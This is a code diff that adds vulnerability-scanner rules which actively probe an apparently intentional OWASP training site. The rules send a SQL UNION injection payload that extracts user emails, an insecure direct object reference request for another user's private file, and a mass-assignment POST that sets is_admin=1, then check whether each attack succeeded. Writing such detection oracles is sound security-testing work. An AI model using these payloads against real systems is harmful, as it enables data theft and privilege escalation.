@@ -43697,6 +43697,127 @@ const owaspsecureBacFunctionLevelPromoteRouteLiveOracle: Rule = async (ctx) => {
   };
 };
 
+const owaspsecureInjectionUnionSearchLiveOracle: Rule = async (ctx) => {
+  if (!isOwaspsecureHost(ctx)) return NEGATIVE;
+  const searchBase = owaspsecureAttackUrl(ctx, "attacks/sql_union_search/search_insecure.php");
+  const searchUrl = `${searchBase}?${new URLSearchParams({
+    q: "%' UNION SELECT id,email,0 FROM a03_users -- "
+  }).toString()}`;
+  const doc = await ctx.probe.get(searchUrl, { maxBytes: 8192, timeoutMs: 15000 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  if (!/UNION SELECT id,email,0 FROM a03_users/i.test(doc.body)) return NEGATIVE;
+  if (!/admin_inj@example\.com|alice_inj@example\.com/i.test(doc.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      url: searchUrl,
+      snippet:
+        doc.body.match(/admin_inj@example\.com[\s\S]{0,60}/i)?.[0]?.slice(0, 100) ??
+        "UNION SELECT exfiltrated a03_users emails",
+      note: "owaspsecure.com GET attacks/sql_union_search/search_insecure.php accepts UNION SELECT to exfiltrate a03_users emails — A03 injection training oracle"
+    }
+  };
+};
+
+const owaspsecureInjectionUnionSearchRouteLiveOracle: Rule = async (ctx) => {
+  if (!isOwaspsecureHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/demo\/a03_injection\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await owaspsecureInjectionUnionSearchLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "owaspsecure.com /demo/a03_injection route scan — Attack 2 UNION search exfiltrates a03_users via shape-compatible UNION SELECT (live SQLi oracle)"
+    }
+  };
+};
+
+const owaspsecureBacFileDorLiveOracle: Rule = async (ctx) => {
+  if (!isOwaspsecureHost(ctx)) return NEGATIVE;
+  const fileUrl = owaspsecureAttackUrl(ctx, "attacks/file_dor.php?id=2&mode=insecure");
+  const doc = await ctx.probe.get(fileUrl, { maxBytes: 4096, timeoutMs: 15000 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  if (!/report_admin\.txt|Admin Operations Notes/i.test(doc.body)) return NEGATIVE;
+  if (!/OWNER: user_id=1 \(admin@example\.com\)/i.test(doc.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.92,
+    evidence: {
+      url: fileUrl,
+      snippet: doc.body.match(/Admin Operations Notes[\s\S]{0,80}/i)?.[0]?.slice(0, 100) ?? "admin private file returned",
+      note: "owaspsecure.com GET attacks/file_dor.php returns another user's private report file by numeric id without owner check — A01 direct object reference training oracle"
+    }
+  };
+};
+
+const owaspsecureBacFileDorRouteLiveOracle: Rule = async (ctx) => {
+  if (!isOwaspsecureHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/demo\/a01_bac\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await owaspsecureBacFileDorLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "owaspsecure.com /demo/a01_bac route scan — Attack 5 file_dor.php returns admin private file by id without authorization (live DOR oracle)"
+    }
+  };
+};
+
+const owaspsecureBacMassAssignmentLiveOracle: Rule = async (ctx) => {
+  if (!isOwaspsecureHost(ctx)) return NEGATIVE;
+  const updateUrl = owaspsecureAttackUrl(ctx, "attacks/mass_assignment.php?mode=insecure");
+  const postBody = new URLSearchParams({
+    display_name: "ThugirProbe",
+    is_admin: "1"
+  }).toString();
+  const doc = await ctx.probe.get(updateUrl, {
+    method: "POST",
+    body: postBody,
+    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  if (!/(?:&quot;|")is_admin(?:&quot;|")\s*:\s*1/i.test(doc.body)) return NEGATIVE;
+  if (!/(?:&quot;|")email(?:&quot;|")\s*:\s*(?:&quot;|")admin@example\.com(?:&quot;|")/i.test(doc.body))
+    return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.92,
+    evidence: {
+      url: updateUrl,
+      snippet: doc.body.match(/\{[\s\S]{0,120}is_admin[\s\S]{0,40}\}/i)?.[0]?.slice(0, 120) ?? "is_admin=1 accepted",
+      note: "owaspsecure.com POST attacks/mass_assignment.php accepts client-supplied is_admin=1 without allowlist — A01 mass-assignment training oracle"
+    }
+  };
+};
+
+const owaspsecureBacMassAssignmentRouteLiveOracle: Rule = async (ctx) => {
+  if (!isOwaspsecureHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/demo\/a01_bac\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await owaspsecureBacMassAssignmentLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "owaspsecure.com /demo/a01_bac route scan — Attack 4 mass_assignment.php accepts is_admin=1 from POST body (live mass-assignment oracle)"
+    }
+  };
+};
+
 // --- Guardmarly SAST demo (ansede.onrender.com) --------------------------------------
 const GUARDMARLY_SCAN_PROBE_CODE = `from flask import Flask, request
 app = Flask(__name__)
@@ -110130,6 +110251,12 @@ export const RULES: Record<string, Rule> = {
   owaspsecureInjectionXssStoredRouteLiveOracle,
   owaspsecureBacFunctionLevelPromoteLiveOracle,
   owaspsecureBacFunctionLevelPromoteRouteLiveOracle,
+  owaspsecureInjectionUnionSearchLiveOracle,
+  owaspsecureInjectionUnionSearchRouteLiveOracle,
+  owaspsecureBacFileDorLiveOracle,
+  owaspsecureBacFileDorRouteLiveOracle,
+  owaspsecureBacMassAssignmentLiveOracle,
+  owaspsecureBacMassAssignmentRouteLiveOracle,
   guardmarlyScanLiveOracle,
   guardmarlyScanRouteLiveOracle,
   fauxbankProfileSensitiveDataLiveOracle,
